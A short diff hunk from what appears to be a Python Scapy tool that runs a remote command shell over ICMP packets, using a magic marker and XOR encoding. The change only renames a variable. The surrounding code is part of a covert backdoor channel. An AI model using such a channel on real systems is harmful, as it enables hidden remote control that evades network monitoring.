@@ -42,7 +42,7 @@ def action(pkt):
 				print "Port"
 			elif buff[4:8] == shell:
 				time.sleep(0.1)
-				command_shell(buff[8:], source, dest)
+				command_shell(buff[8:], source, destination)
 
 def packet_builder(data, dest, sour):
 	packet = Ether() / IP(src=sour,dst=dest) / ICMP(type=0) / (XOR(server_magic + data))
